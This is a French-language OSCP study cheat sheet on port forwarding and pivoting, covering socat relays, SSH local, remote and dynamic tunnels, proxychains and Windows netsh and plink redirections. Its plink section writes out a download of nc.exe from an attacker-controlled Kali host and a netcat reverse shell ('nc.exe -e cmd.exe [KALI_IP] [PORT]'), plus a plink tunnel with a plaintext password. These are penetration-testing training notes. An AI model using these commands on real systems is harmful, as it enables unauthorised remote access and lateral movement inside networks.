---
title: "OSCP · Redirection de ports"
description: "Documenter les redirections locales, distantes et dynamiques."
---

# OSCP · Redirection de ports

Documenter les redirections locales, distantes et dynamiques.


## Redirection avec Socat

Rediriger un flux réseau entre deux ports avec Socat.


<p class="oscp-command-note">Configurer une connexion ou une redirection réseau.</p>

```bash
socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]

```



### Écoute TCP avec fermeture après la connexion

Rediriger les connexions d'un port local vers une cible du laboratoire ; fork permet plusieurs sessions.

<p class="oscp-command-note">Écoute TCP avec fermeture après la connexion.</p>

```bash
socat -d -d TCP-LISTEN:<PORT_LOCAL>,reuseaddr,fork TCP:<IP_CIBLE>:<PORT_CIBLE>
```

## Redirection SSH locale

Rendre un service distant accessible depuis un port local.


<p class="oscp-command-note">Configurer une redirection SSH.</p>

```bash
ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host

```



### Liaison uniquement sur localhost

Ne pas exposer le port redirigé aux autres machines du réseau local.

<p class="oscp-command-note">Liaison uniquement sur localhost.</p>

```bash
ssh -N -L 127.0.0.1:<PORT_LOCAL>:127.0.0.1:<PORT_CIBLE> <UTILISATEUR>@<SERVEUR_SSH>
```

## Redirection SSH dynamique

Créer un proxy SOCKS local avec SSH.


<p class="oscp-command-note">Configurer une redirection SSH.</p>

```bash
ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host

```




```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [local_socks_proxy_port]

```


<p class="oscp-command-note">Utiliser une commande au travers d&#x27;un proxy.</p>

```bash
# Par exemple
proxychains smbclient -L //internal_ip/ -U username --password=password

```


## Redirection SSH distante

Exposer un port local depuis un serveur SSH distant.


<p class="oscp-command-note">Configurer une redirection SSH.</p>

```bash
ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host

```



### Port distant disponible sur localhost

Créer une redirection inverse dont le port d'écoute reste lié à l'interface loopback du serveur SSH.

<p class="oscp-command-note">Port distant disponible sur localhost.</p>

```bash
ssh -N -R 127.0.0.1:<PORT_DISTANT>:127.0.0.1:<PORT_LOCAL> <UTILISATEUR>@<SERVEUR_SSH>
```

## Redirection dynamique distante via SSH

Créer un proxy SOCKS sur le serveur SSH distant.


<p class="oscp-command-note">Configurer une redirection SSH.</p>

```bash
ssh -N -R [proxychains_port] username@remote_host

```




```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [proxychains_port]

```


## Redirection SSH sous Windows

Configurer une redirection SSH depuis Windows.




```powershell
where ssh
ssh.exe -V

```


<p class="oscp-command-note">Configurer une redirection SSH.</p>

```powershell
ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]

```




```bash
# Edit /etc/proxychains4.conf and add
[ProxyList]
socks5 127.0.0.1 [REMOTE_PORT]

```




```bash
ss -ntplu

```


## Redirection avec Plink sous Windows

Utiliser Plink pour rediriger un port sous Windows.


<p class="oscp-command-note">Examiner l&#x27;état des services Linux.</p>

```bash
sudo systemctl start apache2

```


**Paramètres et repères :**
`nc.exe`  


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
find / -name nc.exe 2>/dev/null
sudo cp [SOURCE_PATH]/nc.exe /var/www/html/

```


**Paramètres et repères :**
`nc.exe`  


<p class="oscp-command-note">Télécharger une ressource distante.</p>

```powershell
wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe

```


**Paramètres et repères :**
`nc.exe`  




```powershell
C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]

```


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
find / -name plink.exe 2>/dev/null
sudo cp [SOURCE_PATH]/plink.exe /var/www/html/

```


<p class="oscp-command-note">Télécharger une ressource distante.</p>

```powershell
wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe

```




```powershell
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]

```


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]

```


## Redirection avec netsh sous Windows

Créer une redirection TCP avec netsh portproxy.


**Paramètres et repères :**
`Netsh`  


<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>

```powershell
netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]

```


<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>

```powershell
netstat -anp TCP | find "[LISTEN_PORT]"

```


<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>

```powershell
netsh interface portproxy show all

```


```powershell
# Examiner ou modifier le routage réseau Windows
netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow

```


<p class="oscp-command-note">Ouvrir une connexion SSH.</p>

```bash
ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]

```


<p class="oscp-command-note">Examiner les paramètres réseau Windows.</p>

```powershell
netsh advfirewall firewall delete rule name="[RULE_NAME]"

```


```powershell
# Configurer une redirection de port avec Netsh
netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]

```



### Vérifier une règle portproxy précise

Lister les redirections Windows en place avant et après un changement autorisé.

<p class="oscp-command-note">Vérifier une règle portproxy précise.</p>

```bash
netsh interface portproxy show v4tov4
```

### Vérifier les ports Windows en écoute

Contrôler si un port local est utilisé par un processus avant d'ajouter une redirection.

<p class="oscp-command-note">Vérifier les ports Windows en écoute.</p>

```powershell
Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess
```

## Redirections : diagnostics et vérifications

Vérifier les interfaces et ports concernés avant de créer des redirections. Ne pas confondre tunnel SSH local, tunnel distant, proxy SOCKS et transfert TCP.

### Redirection TCP avec Socat

Écouter localement et transmettre chaque connexion TCP vers un service distant autorisé.

<p class="oscp-command-note">Redirection TCP avec Socat.</p>

```bash
socat TCP-LISTEN:<PORT_LOCAL>,reuseaddr,fork TCP:<IP_SERVICE>:<PORT_SERVICE>
```

### Redirection SSH vers un serveur distant

Exposer un port de la machine locale depuis le serveur SSH, en fonction de sa politique GatewayPorts et de son bind.

<p class="oscp-command-note">Redirection SSH vers un serveur distant.</p>

```bash
ssh -N -R 127.0.0.1:9090:127.0.0.1:80 <UTILISATEUR>@<SERVEUR_SSH>
```

**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md). Synthèse rédigée pour SKILL-ISSUE.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
